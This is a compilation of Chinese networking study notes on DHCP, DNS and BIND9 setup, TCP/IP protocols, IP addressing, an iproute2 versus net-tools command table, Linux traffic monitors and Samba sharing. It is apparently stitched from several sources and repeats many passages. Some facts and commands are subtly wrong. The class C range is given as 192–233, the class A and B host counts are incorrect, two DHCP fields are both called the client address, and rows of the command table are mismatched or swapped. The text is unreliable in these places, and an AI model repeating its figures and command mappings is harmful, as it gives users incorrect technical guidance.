协议结构包含多个字段：Op是消息操作代码；Htype是硬件地址类型；Hlen是硬件地址长度；Xid是处理ID；Secs是从获取到IP地址或者续约过程开始到现在所消耗的时间；Flags是标记；Ciaddr是客户机IP地址；Yiaddr是客户机IP地址；Siaddr是在bootstrap中使用的下一台服务器的IP地址；Giaddr是用于导入的接替代理IP地址；Chaddr是客户机硬件地址；Sname是服务器主机名称；File是引导文件名或受限目录路径名；Options是可选项字段。

DHCP运行分为四个基本过程：1. DHCP发现(DISCOVER)：客户在物理子网上发送广播寻找可用服务器；2. DHCP提供(OFFER)：服务器保留IP地址并广播DHCPOFFER消息；3. DHCP请求(REQUEST)：客户通知所有DHCP服务器已接受租约；4. DHCP确认(ACK)：服务器发送DHCPACK包完成配置。客户端配置参数通过Option 60进行供应商识别，实现特定功能选择。

在Ubuntu系统安装DHCP服务器：1. 执行安装命令：sudo apt-get install isc-dhcp-server；2. 配置监听网卡：备份并编辑/etc/default/isc-dhcp-server文件，设置INTERFACES="eth0"；3. 配置主文件：备份并编辑/etc/dhcp/dhcpd.conf，添加地址池(如subnet 192.168.4.0)、租期设置(default-lease-time 6000)等参数；4. 重启服务：sudo /etc/init.d/isc-dhcp-server restart。

标题：DNS服务
域名系统（英文：Domain Name System，DNS）是因特网的一项服务，它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便的访问互联网。DNS 使用TCP和UDP端口53。

当前，对于每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符。

开始时，域名的字符仅限于ASCII字符的一个子集。2008年，ICANN通过一项决议，允许使用其它语言作为互联网顶级域名的字符。使用基于Punycode码的IDNA系统，可将Unicode字符串映射为有效的DNS字符集。

DNS最早于1983年由保罗·莫卡派乔斯（Paul Mockapetris）发明；原始的技术规范在882号因特网标准草案（RFC 882）中发布。1987年发布的第1034和1035号草案修正了DNS技术规范，并废除了之前的第882和883号草案。

早期的域名必须以英文句号“.”结尾，当用户访问www.wikipedia.org的HTTP服务时需输入http://www.wikipedia.org.，如今DNS服务器已可自动补上结尾的句号。

主机记录(A记录)：RFC 1035定义，将特定主机名映射到对应主机的IP地址；别名记录(CNAME记录)：RFC 1035定义，将别名指向到某个A记录，无需为新名字创建新A记录。

IPv6主机记录(AAAA记录)：RFC 3596定义，映射特定主机名到IPv6地址；服务位置记录(SRV记录)：RFC 2782定义，定义提供特定服务的服务器位置（如主机、端口）。

NAPTR记录：RFC 3403定义，提供正则表达式方式映射域名，著名应用是用于ENUM查询。

DNS通过允许名称服务器将部分名称服务（zone）“委托”给子服务器，实现层次结构的名称空间；还提供系统别名、联系信息及邮件枢纽主机等额外信息。

公共Internet DNS系统基于13个全球范围的“根服务器”（root-servers.net），除3个外，其余均位于美国；余下命名空间委托给其他DNS服务器负责特定部分。

DNS系统常用驱动软件包括BIND（使用最广）、DJBDNS、MaraDNS、NSD（Name Server Daemon）、PowerDNS。

Punycode根据RFC 3492标准制定，用于将域名的Unicode编码转换为DNS可用编码，还可根据IANA域名相异字表防止IDN欺骗。

zh.wikipedia.org对应IP地址208.80.154.225；DNS类似自动电话号码簿，将便于人类使用的域名转化为机器识别的IP地址。

DNS查询分递归和迭代：客户端DNS服务器（递归服务器）全权处理请求至返回结果；DNS服务器之间采用迭代查询。

查询zh.wikipedia.org时，DNS服务器无缓存则先向根服务器查.org域权威服务器地址，再向.org域查.wikipedia.org域权威服务器地址，最后向该服务器查zh的A记录并缓存返回。

大多数根域名服务器的基本WHOIS由ICANN维护，细节由域注册机构负责；.CN、.HK、.TW域名的WHOIS分别由CNNIC、香港互联网注册管理有限公司、台湾网络信息中心维护。

DNS系统控制方式常被指责，焦点包括VeriSign等企业滥用DNS、顶级域名分配问题；部分人认为部分DNS软件难适配动态IP，但这是实现问题非协议问题。

黑客通过伪造DNS服务器将用户引向错误网站窃取隐私，目前约有68000台此类恶意DNS服务器。

安装Bind9的终端命令为sudo apt-get -y install bind9 bind9utils；修改DNS地址需执行echo "nameserver 192.168.1.101" >> /etc/resolv.conf，再重启网络。

创建DNS正向Zone文件需编辑/etc/bind/named.conf.local，添加zone "wangyan.org"{type master; file "db.wangyan.org";}；type master表示主配置文件。

Linux系统中，检查MX记录生效用host -t mx example.com，dig工具测试用dig wangyan.org；named-checkzone工具可检查区域文件正确性，命令为named-checkzone wangyan.org /var/cache/bind/db.wangyan.org。

域名系统（英文：Domain Name System，DNS）是因特网的一项服务，它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便的访问互联网。DNS 使用TCP和UDP端口53。当前，对于每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符。

DNS系统中，常见的资源记录类型有：主机记录(A记录)：RFC 1035定义，A记录是用于名称解析的重要记录，它将特定的主机名映射到对应主机的IP地址上。别名记录(CNAME记录): RFC 1035定义，CNAME记录用于将某个别名指向到某个A记录上。

安装Bind9的方法：命令安装,终端执行：sudo apt-get -y install bind9 bind9utils。修改DNS服务器地址：echo "nameserver 192.168.1.101" >> /etc/resolv.conf；/etc/init.d/networking restart #重启网络。

DNS查询有两种方式：递归 和 迭代。DNS客户端设置使用的DNS服务器一般都是递归服务器，它负责全权处理客户端的DNS查询请求，直到返回最终结果。而DNS服务器之间一般采用迭代查询方式。

标题：TCP/IP 协议
TCP/IP 是基于 TCP 和 IP 这两个最初的协议之上的不同的通信协议的大集合。

TCP 用于从应用程序到网络的数据传输控制。TCP 负责在数据传送之前将它们分割为 IP 包，然后在它们到达的时候将它们重组。

IP 负责计算机之间的通信。IP 负责在因特网上发送和接收数据包。

HTTP 负责 web 服务器与 web 浏览器之间的通信。HTTP 用于从 web 客户端（浏览器）向 web 服务器发送请求，并从 web 服务器向 web 客户端返回内容（网页）。

HTTPS 负责在 web 服务器和 web 浏览器之间的安全通信。作为有代表性的应用，HTTPS 会用于处理信用卡交易和其他的敏感数据。

SSL 协议用于为安全数据传输加密数据。

SMTP 协议用于传输电子邮件。SMTP 负责把邮件发送到另一台计算机。通常情况下，邮件会被送到一台邮件服务器（SMTP 服务器），然后被送到另一台（或几台）服务器，然后最终被送到它的目的地。SMTP 也可以传送纯文本，但是无法传输诸如图片、声音或者电影之类的二进制数据。SMTP 使用 MIME 协议通过 TCP/IP 网络来发送二进制数据。MIME 协议会将二进制数据转换为纯文本。

MIME 协议使 SMTP 有能力通过 TCP/IP 网络传输多媒体文件，包括声音、视频和二进制数据。

IMAP 用于存储和取回电子邮件。与 POP 类似，IMAP 协议同样被邮件程序使用。IMAP 协议与 POP 协议之间的主要差异是：如果 IMAP 连上了邮件服务器，它不会自动地将邮件下载到邮件程序之中。IMAP 使您有能力在下载邮件之前先通过邮件服务器端查看他们。通过 IMAP，您可以选择下载这些邮件或者仅仅是删除它们。比方说您需要从不同的位置访问邮件服务器，但是仅仅希望回到办公室的时候再下载邮件，IMAP 在这种情况下会很有用。

POP 协议被邮件程序用来取回邮件服务器上面的邮件。假如您的邮件程序使用 POP，那么一旦它连接上邮件服务器，您的所有的邮件都会被下载到邮件程序中（或者称之为邮件客户端）。

FTP 负责计算机之间的文件传输。

NTP 用于在计算机之间同步时间（钟）。

DHCP 用于向网络中的计算机分配动态 IP 地址。

SNMP 用于计算机网络的管理。

LDAP 用于从因特网搜集关于用户和电子邮件地址的信息。

ICMP 负责网络中的错误处理。

ARP 用于通过 IP 来查找基于 IP 地址的计算机网卡的硬件地址。

RARP 用于通过 IP 查找基于硬件地址的计算机网卡的 IP 地址。

BOOTP 用于从网络启动计算机。

PPTP 用于私人网络之间的连接（隧道）。

标题：TCP/IP 寻址
TCP/IP 使用 32 个比特或者 4 组 0 到 255 之间的数字来为计算机编址。

每个计算机必须有一个 IP 地址才能够连入因特网。每个 IP 包必须有一个地址才能够发送到另一台计算机。

TCP/IP 使用 4 组数字来为计算机编址。每个计算机必须有一个唯一的 4 组数字的地址。每组数字必须在 0 到 255 之间，并由点号隔开，比如：192.168.1.60。

TCP/IP 使用 32 个比特来编址。一个计算机字节是 8 比特。所以 TCP/IP 使用了 4 个字节。32比特 = 4字节。一个计算机字节可以包含 256 个不同的值。

IPv6 是 'Internet Protocol Version 6' 的缩写，也被称作下一代互联网协议，它是由 IETF 小组（Internet 工程任务组Internet Engineering Task Force）设计的用来替代现行的 IPv4（现行的）协议的一种新的 IP 协议。

Internet 的主机都有一个唯一的 IP 地址，IP 地址用一个 32 位二进制的数表示一个主机号码，但 32 位地址资源有限，已经不能满足用户的需求了，因此 Internet 研究组织发布新的主机标识方法，即 IPv6。

在 RFC1884 中（RFC 是 Request for Comments document 的缩写。RFC 实际上就是 Internet 有关服务的一些标准），规定的标准语法建议把 IPv6 地址的 128 位（16 个字节）写成 8 个 16 位的无符号整数，每个整数用 4 个十六进制位表示，这些数之间用冒号（:）分开，例如：686E：8C64：FFFF：FFFF：0：1180：96A：FFFF

冒号十六进制记法允许零压缩，即一串连续的0可以用一对冒号取代，例如：FF05：0：0：0：0：0：0：B3可以定成：FF05：：B3。为了保证零压缩有一个清晰的解释，建议中规定，在任一地址中，只能使用一次零压缩。

冒号十六进制记法结合有点十进制记法的后缀。这种结合在IPv4向IPv6换阶段特别有用。例如，下面的串是一个合法的冒号十六进制记法：0：0：0：0：0：0：128.10.1.1。

冒号十六进制记法结合点十进制记法的后缀中，虽然冒号所分隔的每一个值是一个16位的量，但每个分点十进制部分的值则指明一个字节的值。再使用零压缩即可得出：：：128.10.1.1。

12 个阿拉伯数字很难记忆。使用一个名称更容易。用于 TCP/IP 地址的名字被称为域名。runoob.com 就是一个域名。

当你键入一个像 http://www.runoob.com 这样的域名，域名会被一种 DNS 程序翻译为数字。在全世界，数量庞大的 DNS 服务器被连入因特网。

DNS 服务器负责将域名翻译为 TCP/IP 地址，同时负责使用新的域名信息更新彼此的系统。当一个新的域名连同其 TCP/IP 地址一起注册后，全世界的 DNS 服务器都会对此信息进行更新。

TCP/IP 使用 4 组数字来为计算机编址。每个计算机必须有一个唯一的 4 组数字的地址。每组数字必须在 0 到 255 之间，并由点号隔开，比如：192.168.1.60。TCP/IP 使用 32 个比特来编址。一个计算机字节是 8 比特。所以 TCP/IP 使用了 4 个字节。32比特 = 4字节。

IPv6 是 'Internet Protocol Version 6' 的缩写，也被称作下一代互联网协议，它是由 IETF 小组（Internet 工程任务组 Internet Engineering Task Force）设计的用来替代现行的 IPv4 协议的一种新的 IP 协议。IP 地址用一个 32 位二进制的数表示一个主机号码，但 32 位地址资源有限，已经不能满足用户的需求了，因此发布新的主机标识方法，即 IPv6。IPv6 地址的 128 位写成 8 个 16 位的无符号整数，每个整数用 4 个十六进制位表示，这些数之间用冒号（:）分开。冒号十六进制记法允许零压缩，即一串连续的0可以用一对冒号取代。

12 个阿拉伯数字很难记忆。使用一个名称更容易。用于 TCP/IP 地址的名字被称为域名。runoob.com 就是一个域名。当你键入一个像 http://www.runoob.com 这样的域名，域名会被一种 DNS 程序翻译为数字。DNS 服务器负责将域名翻译为 TCP/IP 地址，同时负责使用新的域名信息更新彼此的系统。当一个新的域名连同其 TCP/IP 地址一起注册后，全世界的 DNS 服务器都会对此信息进行更新。

标题：TCP/IP基础介绍
TCP/IP 是用于因特网 (Internet) 的通信协议。TCP/IP 是供已连接因特网的计算机进行通信的通信协议。TCP/IP 指传输控制协议/网际协议。TCP/IP 定义了电子设备（比如计算机）如何连入因特网，以及数据如何在它们之间传输的标准。

计算机通信协议是对那些计算机必须遵守以便彼此通信的的规则的描述。

TCP (传输控制协议) - 应用程序之间通信；UDP (用户数据报协议) - 应用程序之间的简单通信；IP (网际协议) - 计算机之间的通信；ICMP (因特网消息控制协议) - 针对错误和状态；DHCP (动态主机配置协议) - 针对动态寻址。

处理数据通信的协议包括：TCP (传输控制协议) - 应用程序之间通信；UDP (用户数据报协议) - 应用程序之间的简单通信；IP (网际协议) - 计算机之间的通信；ICMP (因特网消息控制协议) - 针对错误和状态；DHCP (动态主机配置协议) - 针对动态寻址。

TCP 用于应用程序之间的通信。当应用程序希望通过 TCP 与另一个应用程序通信时，它会发送一个通信请求。这个请求必须被送到一个确切的地址。在双方'握手'之后，TCP 将在两个应用程序之间建立一个全双工 (full-duplex) 的通信。这个全双工的通信将占用两个计算机之间的通信线路，直到它被一方或双方关闭为止。UDP 和 TCP 很相似，但是更简单，同时可靠性低于 TCP。

TCP 用于应用程序之间的通信。当应用程序希望通过 TCP 与另一个应用程序通信时，它会发送一个通信请求。这个请求必须被送到一个确切的地址。在双方"握手"之后，TCP 将在两个应用程序之间建立一个全双工 (full-duplex) 的通信。这个全双工的通信将占用两个计算机之间的通信线路，直到它被一方或双方关闭为止。

IP 用于计算机之间的通信。IP 是无连接的通信协议。它不会占用两个正在通信的计算机之间的通信线路。这样，IP 就降低了对网络线路的需求。每条线可以同时满足许多不同的计算机之间的通信需要。通过 IP，消息（或者其他数据）被分割为小的独立的包，并通过因特网在计算机之间传送。IP 负责将每个包路由至它的目的地。

IP 用于计算机之间的通信。IP 是无连接的通信协议。它不会占用两个正在通信的计算机之间的通信线路。这样，IP 就降低了对网络线路的需求。每条线可以同时满足许多不同的计算机之间的通信需要。通过 IP，消息被分割为小的独立的包，并通过因特网在计算机之间传送。IP 负责将每个包路由至它的目的地。

当一个 IP 包从一台计算机被发送，它会到达一个 IP 路由器。IP 路由器负责将这个包路由至它的目的地，直接地或者通过其他的路由器。在一个相同的通信中，一个包所经由的路径可能会和其他的包不同。而路由器负责根据通信量、网络中的错误或者其他参数来进行正确地寻址。

TCP/IP 意味着 TCP 和 IP 在一起协同工作。TCP 负责应用软件（比如您的浏览器）和网络软件之间的通信。IP 负责计算机之间的通信。TCP 负责将数据分割并装入 IP 包，然后在它们到达的时候重新组合它们。IP 负责将包发送至接受者。

TCP/IP 意味着 TCP 和 IP 在一起协同工作。TCP 负责应用软件和网络软件之间的通信。IP 负责计算机之间的通信。TCP 负责将数据分割并装入 IP 包，然后在它们到达的时候重新组合它们。IP 负责将包发送至接受者。

标题：网络基础
本页面简单介绍网络的基础知识.

网络类型大体可分: 局域网（Local Area Network, LAN）:又称内网,指在某一区域内由多台计算机互联成的计算机网络。

按照网络覆盖的区域（距离）不同，其他的网络类型还包括个人网、城域网、广域网等。

互联网 (Internet）:又称网际网路，或音译因特网、英特网，是网络与网络之间所串连成的庞大网络，这些网络以一组通用的协议相连。

网络终端一般可分为: 服务器(Server):为其他计算机提供某种服务的计算机,一般是性能比较高的计算机。

网络终端一般可分为: 工作站(Workstation):为其他计算机提供服务的计算机；客户端(Client):要求服务器向其服务的计算机,一般是个人用户的普通电脑。

TCP/IP协议包含了一系列构成互联网基础的网络协议，最早发源于美国国防部的ARPA网项目，TCP/IP模型也被称作DoD模型(Department of Defense Model)。

TCP/IP字面上代表两个协议：TCP（传输控制协议）和IP（网际协议），1983年1月1日，在ARPA网中，TCP/IP协议取代了旧的网络控制协议（NCP，Network Control Protocol）。

最早的TCP/IP由文顿·瑟夫和罗伯特·卡恩开发，战胜了ISO的OSI模型；1990年代中期，HTML和浏览器Mosaic的出现推动了TCP/IP和互联网应用的飞速发展。

随着互联网发展，目前流行的IPv4协议（网际协议版本四）已经接近功能上限，IPv6是IPv4的下一代互联网协议版本。

IP地址(Internet Protocol Address)是互联网协议地址，在Internet上用于给主机编址，可通过它唯一确定网络上的一台计算机。

静态地址由网络管理员根据预先定义的互联网络寻址规划分配，除非手动修改否则不变，不会因计算机重启或网络接口重启丢失。

动态地址是设备连接网络时通过与协议相关的过程获得，每次连接网络获得的地址通常不同。

IP地址长度为32位（共2^32个），分4段每段8位，用十进制表示，每段范围0～255，段间用句点隔开，例如159.226.1.1。

IP地址由网络地址和主机地址两部分组成，分为A、B、C、D、E5类，常用的是B和C两类。

A类IP地址第一段数字范围1~127，每个可连接16387064台主机，共126组，适合大型网络。

B类IP地址第一段数字范围128~191，每个可连接64516台主机，共64组，适合中型网络。

C类IP地址第一段数字范围192~233，每个可连接254台主机，共32组，适合小型网络。

D类IP地址第一段数字范围224~239，用作多目的地信息传输，多为备用；E类第一段240~254，保留作因特网实验和开发。

子网掩码是指明IP地址中标识子网和主机的位掩码，默认A类为255.0.0.0，B类为255.255.0.0，C类为255.255.255.0。

私有网络遵守RFC 1918和RFC 4193规范，使用私有IP地址空间，私有IP无法直接连互联网，需公网IP转发，且在internet中不被分配。

私有IP免费且节省地址资源，更安全，常用于家庭、学校、企业局域网，公有IP不足时可用NAT方式转发封包。

可分配的私有IP地址：A类10.0.0.0–10.255.255.255，B类172.16.0.0–172.31.255.255，C类192.168.0.0–192.168.255.255。

网关又称网间连接器、协议转换器，在传输层实现网络互连，仅用于两个高层协议不同的网络，可用于广域网和局域网互连。

网关是转换重任的计算机系统或设备，在不同协议、格式的系统间充当翻译器，会重新打包信息适配目的系统，还可提供过滤和安全功能。

路由是通过互联网络将信息从源地址传输到目的地址的活动，发生在OSI模型的第三层即网络层。

DNS（域名系统）是因特网核心服务，作为域名与IP地址相互映射的分布式数据库，使人无需记IP数串即可方便访问互联网。

MAC地址（Media Access Control Address）又称硬件地址，是定义网络设备位置的地址。

网络类型大体可分:
- 局域网（Local Area Network, LAN）:又称内网,指在某一区域内由多台计算机互联成的计算机网络。按照网络覆盖的区域（距离）不同，其他的网络类型还包括个人网、城域网、广域网等。
- 互联网 (Internet）:又称网际网路，或音译因特网、英特网，是网络与网络之间所串连成的庞大网络，这些网络以一组通用的协议相连，形成逻辑上的单一巨大国际网络。

网络终端一般可分:
- 服务器(Server):为其他计算机提供某种服务的计算机,一般是性能比较高计算机.
- 工作站(Workstation):为其他计算机提供服务的计算机.
- 客户端(Client):就是要求服务器向其服务的计算机,一般来说是为个人用户的普通电脑.

TCP/IP协议包含了一系列构成互联网基础的网络协议。这些协议最早发源于美国国防部的ARPA网项目。TCP/IP模型也被称作DoD模型(Department of Defense Model)。TCP/IP字面上代表了两个协议：TCP（传输控制协议）和IP（网际协议）。

1983年1月1日，在因特网的前身（ARPA网）中，TCP/IP协议取代了旧的网络控制协议（NCP，Network Control Protocol），从而成为今天的互联网的基石。最早的TCP/IP由文顿·瑟夫和罗伯特·卡恩两位开发，慢慢地通过竞争战胜了其他一些网络协议的方案，比如国际标准化组织ISO的OSI模型。TCP/IP的蓬勃发展发生在1990年代中期。当时一些重要而可靠的工具的出世，例如页面描述语言HTML和浏览器Mosaic，导致了互联网应用的飞速发展。

随着互联网的发展，目前流行的IPv4协议（网际协议版本四）已经接近它的功能上限。

常见的IP地址分为:
- IPv4:互联网协议版本4（Internet Protocol version 4）是互联网协议开发过程中的第四个修订版本(网际网协四版)，也是此协议第一个被广泛部署的版本。
- IPv6:互联网通信协议第6版（Internet Protocol version 6）是用于数据包交换互联网络的网络层协议，是IPv4的下一代互联网协议版本。

IP地址的获得方式

静态地址(static address):是由网络管理员根据一个预先定义好的互联网络寻址规划来分配给设备的。除非网络管理员手动修改，否则静态地址是保持不变的,不会随着计算机的重新启动或者重启网络接口而丢失.

动态地址（dynamic address）:是设备在连接到网络时通过某个与协议特定相关的过程来获得的。设备在使用动态地址时，每次连接到网络时所获得地址通常是不同的。

IP地址的长度为32位(共有2^32个IP地址)，分为4段，每段8位，用十进制数字表示，每段数字范围为0～255，段与段之间用句点隔开。例如159.226.1.1。

IP地址有两部分组成,一部分为网络地址,另一部分为主机地址,IP地址分为A、B、C、D、E5类，常用的是B和C两类。
- A类:第一段数字范围为1~127，每个A类地址可连接16387064台主机，因特网上有126组A类地址,适合大型网络。
- B类:第一段数字范围为128~191，每个B类地址可连接64516台主机，因特网上有64组B类地址,适合中型网络。
- C类:第一段数字范围为192~233，每个C类地址可接254台主机，因特网上有32组C类地址,适合小型网络。
- D类:第一段数字范围为224~239，D类地址用作多目的的地信息的传输，多为作备。
- E类:第一段数字范围为240~254。E类地址保留，仅作为因特网的实验和开发之用。

子网掩码(Subnetwork mask）:又叫子网掩码、地址掩码、子网路遮罩（subnet mask），它是一种用来指明一个IP地址的哪些位标识的是主机所在的子网以及哪些位标识的是主机的位掩码。默认情况:
- A类的子网掩码是:255.0.0.0
- B类的子网掩码是:255.255.0.0
- C类的子网掩码是:255.255.255.0

私有网络:在互联网的地址架构中，私有网络是指遵守 RFC 1918 和 RFC 4193 规范，使用私有IP地址空间的网络。

私有IP无法直接连接互联网，需要公网IP转发。与公网IP相比，私有IP是免费的，也节省了IP地址资源，适合在局域网使用。私有IP地址在internet中不会被分配。用途一般分为:
- 私有IP无法直接被互联网所访问，因此，相对于公网IP地址，它更加安全。
- 私有IP常被用于家庭，学校和企业的局域网。对于分配公有IP不足的地方，可使用NAT方式转发封包。

可以分配的私有IP地址包括:
- A类:网络部分10.0.0.0 – 10.255.255.255
- B类:网络部分172.16.0.0 – 172.31.255.255
- C类:网络部分192.168.0.0 – 192.168.255.255

网关(Gateway):又称网间连接器、协议转换器。网关在传输层上以实现网络互连，是最复杂的网络互连设备，仅用于两个高层协议不同的网络互连。网关既可以用于广域网互连，也可以用于局域网互连。

网关是一种充当转换重任的计算机系统或设备。在使用不同的通信协议、数据格式或语言，甚至体系结构完全不同的两种系统之间，网关是一个翻译器。与网桥只是简单地传达信息不同，网关对收到的信息要重新打包，以适应目的系统的需求。同时，网关也可以提供过滤和安全功能。

路由（routing）:就是通过互联的网络把信息从源地址传输到目的地址的活动。路由发生在OSI网络参考模型中的第三层即网络层。

DNS:域名系统(Domain Name System，DNS）是因特网的一项核心服务，它作为可以将域名和IP地址相互映射的一个分布式数据库，能够使人更方便的访问互联网，而不用去记住能够被机器直接读取的IP数串。

MAC地址（Media Access Control Address）:媒体访问控制地址，或称为硬件地址，是用来定义网络设备的位置的。

标题：iproute2 vs net-tools
# iproute2 vs net-tools
本文来自于 https://linoxide.com/iproute2-vs-net-tools/

Linux查询网络相关的命令工具主要有两个包，iproute2和net-tools。

iproute2在Linux基金会的百科网址：https://wiki.linuxfoundation.org/networking/iproute2
net-tools的官网：https://net-tools.sourceforge.io/


|  iproute2   | net-tools  |  功能 |
|  ----  | ----  | ---- |
| ip link show  | ifconfig -a | 显示所有接口 |
| ip link set down/up eth0  | ifconfig eth0 up/down | 启用 (UP)/禁用 (DOWN) 网络接口 |
| ip addr add 192.168.0.10/24 dev eth0 | ifconfig eth0 192.168.0.10/24 | 为网络接口分配 IPv4 地址 |
| ip addr del 192.168.0.10/24 dev eth0 | ifconfig eth0 0 | 从网络接口中删除 IPv4 地址 |
| ip addr show dev eth0 | ifconfig eth0 | 显示网络接口的 IPv4 地址 |
| ip -6 addr add fe80::f0b7:57ff:fe2f:5f0d/64 dev eth1 | ifconfig eth1 inet6 add fe80::f0b7:57ff:fe2f:5f0d/64 | 将 IPv6 地址分配给网络接口 |
| ip -6 addr show dev eth0 | ifconfig eth0 | 显示网络接口的 IPv6 地址 |
| ip link set dev eth0 address 02:42:20:d2:28:36 | ifconfig eth0 hw ether 02:42:20:d2:28:36 | 更改网络接口的 MAC 地址 |
| ip route show | route -n | 显示 IP 路由表 |
| ip route add default via 192.168.0.1 dev eth0 | route add default gw 192.168.0.1 eth0 | 添加默认路由 |
| ip route replace default via 192.168.0.1 dev enp0s3 | route del default gw 192.168.0.1 enp0s3 | 删除默认路由 |
| ip route add 10.24.32.0/24 via 192.168.0.1 dev enp0s3 | route add -net 10.24.32.0/24 gw 192.168.0.1 dev enp0s3 | 添加静态路由 |
| ip route del 192.168.10.0/24 | route del -net 192.168.10.0/24 | 删除静态路由 |
| ss | netstat | 显示套接字 - 监听 tcp/udp |
| arp -an  | ip neigh | 显示 ARP 表 |
| bridge  | 	brctl | 管理网桥地址和设备 |

标题：Linux之网络相关的命令及解析
ethtool命令用于查询ethX网口基本设置、及设置网卡的参数。其语法格式为：ethtool [参数]

ethtool命令的常用参数及解析如下：-i：显示网卡驱动的信息；-E：修改网卡只读存储器字节；-K：修改网卡 Offload 的状态；ethx：查询ethx网口基本设置，其中 x 是对应网卡的编号，如eth0、eth1等；-s：修改网卡的部分配置；-t：让网卡执行自我检测

ethtool命令的参考实例：查询网口基本设置的命令为[root@root ~]# ethtool eth0；查询网口的驱动相关信息的命令为[root@root ~]# ethtool -i eth0；设置网口工作方式的命令为[root@root ~]# ethtool -s eth0 autoneg off speed 100 duplex full

ethtool命令用于查询ethX网口基本设置、及设置网卡的参数。语法格式：ethtool [参数]。常用参数：-i 显示网卡驱动的信息，-E 修改网卡只读存储器字节，-K 修改网卡 Offload 的状态，ethx 查询ethx网口基本设置，其中 x 是对应网卡的编号，-s 修改网卡的部分配置，-t 让网卡执行自我检测。

nload是实时统计网卡带宽使用率的工具，其语法格式为：nload [网卡]

nload命令的参考实例：指定监测eno1网卡流量的命令为[root@root ~]# nload eno1；监测所有网卡流量的命令为[root@root ~]# nload；在nload监测界面中，按【回车键】可查看下一个网卡监测情况

nload监测界面的字段解析：Curr表示当前流量，Avg表示平均流量，Min表示最小流量，Max表示最大流量，Ttl表示总流量

nload命令实时统计网卡带宽使用率，语法格式：nload [网卡]。指定监测网卡：nload eno1，监测所有网卡：nload。输出字段：Curr当前流量，Avg平均流量，Min最小流量，Max最大流量，Ttl总流量。

nethogs是一个小型的net top工具，按进程进行带宽分组，无需依赖特殊内核模块，可找出占用带宽的进程PID。其语法格式为：nethogs [参数] [设备]

nethogs命令的常用参数及解析：设备：要监控的设备，默认“eth0”；-d：以秒为单位的界面刷新频率，默认为一秒；-v：选择查看模式，mode取值为0（KB/s）、1（total KB）、2（total B）、3（total MB），默认为0；-t：追踪模式

nethogs命令的参考实例：设置5秒刷新一次的命令为[root@root ~]# nethogs -d 5；监视eth0设备网络带宽的命令为[root@root ~]# nethogs eth0

nethogs按进程进行带宽分组监测，语法格式：nethogs [参数] [设备]。常用参数：-d 秒为单位的刷新频率，-v 选择查看模式（0=KB/s,1=KB等），-t 追踪模式。示例：nethogs -d 5 设置5秒刷新。

iftop是实时流量监控工具，监控TCP/IP连接，无报表功能，需以root身份运行；其语法格式为：iftop [参数]

iftop命令的常用参数及解析：-i：指定要监控的网卡；-n：直接显示IP，不进行DNS反解析

iftop命令的参考实例：默认监控第一块网卡流量的命令为[root@root ~]# iftop；监控eth1网卡流量的命令为[root@root ~]# iftop -i eth1

iftop监控TCP/IP连接，实时流量监控工具。语法格式：iftop [参数]。常用参数：-i 指定监控网卡，-n 直接显示IP不进行DNS解析。必须root身份运行，使用pcap库捕获数据包。

iptraf是交互式、色彩鲜艳的IP局域网监控工具，全拼为IP traffic monitor，支持命令行和菜单操作（不带参数进入菜单）。其语法格式为：iptraf [参数] [网卡]

iptraf命令的常用参数及解析：-i：立即在指定网络接口上开启IP流量监视；-g：立即开始生成网络接口的概要状态信息；-h：显示帮助信息

iptraf命令的参考实例：监视eth0网卡详细流量的命令为[root@root ~]# iptraf -d eth0；监视eth0网卡TCP/UDP流量的命令为[root@root ~]# iptraf -s eth0

iptraf是一款交互式IP局域网监控工具，显示连接数据量。语法格式：iptraf [参数] [网卡]。常用参数：-i 在指定接口开启IP流量监视，-d 监视明细网络流量，-s 监视TCP/UDP流量。

ifstat是统计网络接口活动状态的工具，系统默认不安装，需下载源码包编译安装。其语法格式为：ifstat [参数]

ifstat命令的常用参数及解析：-p：优化打印；-a：忽略历史记录；-e：显示错误信息。参考实例：使用-e参数显示网络接口错误信息的命令为[root@root ~]# ifstat -e

标题：Samba服务
Samba，是种用来让UNIX系列的操作系统与微软Windows操作系统的SMB/CIFS（Server Message Block/Common Internet File System）网络协定做连结的自由软件。

目前的版本（v3）不仅可存取及分享SMB的资料夹及打印机，本身还可以整合入Windows Server的网域，扮演为网域控制站（Domain Controller）以及加入Active Directory成员。简而言之，此软件在Windows与UNIX系列OS之间搭起一座桥梁，让两者的资源可互通有无。

安德鲁·垂鸠（Andrew Tridgell）于1992年在澳洲国立大学（ANU）开发了第一版的Samba Unix软件。

Samba是许多服务以及协议的实现，其包括TCP/IP上的NetBIOS（NBT）、SMB、CIFS（SMB的增强版本）、 DCE/RPC或者更具体来说MSRPC（網絡鄰居协议套件）、一种 WINS服务器（也被称作NetBIOS Name Server（NBNS））、NT 域协议套件（包括NT Domain Logons、Secure Accounts Manager（SAM）数据库、Local Security Authority（LSA）服务、NT-style打印服务（SPOOLSS）、NTLM以及近来出现的包括一种改进的Kerberos协议与改进的轻型目录访问协议（LDAP）在内的Active Directory Logon服务）。以上这些服务以及协议经常被错误地归类为NetBIOS或者SMB。

Samba也能够用于共享打印机；还能够为选定的Unix目录（包括所有子目录）建立网络共享，该功能使得Windows用户可以像访问普通Windows下的文件夹那样来通过网络访问这些Unix目录。

Samba的相关软件包括：Samba TNG（Samba的一个分支，其在NT域服务关键部分的结构及实现具有明显的不同）、LinNeighborhood、LDAP Account Manager、Kerberos protocol、Smb4K（KDE 环境下的 SMB/CIFS 共享资源浏览器）、Smbldap-Tools（用户和群组管理工具）。

安装Samba服务的第一步：在终端输入命令‘sudo apt-get install samba’来安装Samba服务。

安装Samba服务后，需安装nautilus扩展：终端输入‘sudo apt-get install nautilus-share’；该扩展作用是在nautilus文件管理器中，可在需要共享的文件夹上右键选择‘本地网络共享’；红色框内的选项最好不要选择，因存在风险。

直接创建Samba共享可能出现错误：‘net usershare returned error 255: net usershare: cannot open usershare directory /var/lib/samba/usershares. Error Permission denied You do not have permission to create a usershare. Ask your administrator to grant you permissions to create a share.’；解决办法是把用户名加入sambashare组，执行命令‘sudo adduser 你的用户名 sambashare’（‘你的用户名’替换为实际用户名）。

将用户名加入sambashare组后，另一台机器仍无法访问共享，需设置密码：执行命令‘sudo smbpasswd -a 你的用户名’（‘你的用户名’替换为实际用户名）。

在另一台电脑上访问Samba共享：会提示输入用户名和密码，输入加入sambashare组的用户名及设置的密码即可。

